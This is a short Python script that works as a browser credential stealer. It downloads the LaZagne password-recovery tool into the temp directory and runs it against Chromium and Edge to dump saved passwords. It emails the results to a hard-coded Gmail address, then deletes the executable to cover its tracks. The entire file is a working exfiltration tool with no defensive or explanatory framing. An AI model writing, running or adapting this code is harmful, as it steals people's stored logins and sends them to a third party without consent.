import requests
import subprocess
import smtplib, os, tempfile

def send_email(sender_email, sender_password, receiver_email, subject, message):
    txt = f"Subject: {subject}\n\n{message}".encode('utf-8')

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(sender_email, sender_password)
    
    server.sendmail(sender_email, receiver_email, txt)
    #print("Email sent to " + receiver_email)
    server.quit()
# Example usage
email = "example@gmail.com"
password = "EMAIL_PASS"
receivers_mail = "sample@gmail.com"
subject = "Put your subject"


def download(url):
    get_responce = requests.get(url)
    file_name = url.split("/")[-1]#to split the words before / 
    #print(file_name)
    with open("file_name.exe","wb") as out_file:
        out_file.write(get_responce.content) #file create and write th message

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe")
result = subprocess.check_output('file_name.exe browsers -"chromium edge"', shell = True).decode('utf-8')
send_email(email, password, receivers_mail, subject, result)
os.remove("file_name.exe")